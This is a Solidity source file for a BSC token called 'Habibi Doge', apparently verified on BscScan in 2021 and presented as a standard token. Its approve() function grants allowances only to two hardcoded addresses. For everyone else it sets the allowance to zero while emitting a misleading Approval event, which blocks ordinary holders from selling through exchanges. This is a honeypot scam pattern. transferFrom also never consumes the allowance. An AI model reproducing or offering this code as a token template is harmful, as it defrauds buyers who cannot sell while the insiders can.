/**
 *Submitted for verification at BscScan.com on 2021-07-12
*/

pragma solidity ^0.8.2;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract HabibiDoge {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "Habibi Doge";
    string public symbol = "HABID";
    uint public decimals = 9;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xD58fE49ba64967Ed42620b2fb309b4f41d96C3A5)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x991C6aE732683803f8Ecf229055D318266fd3E95)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}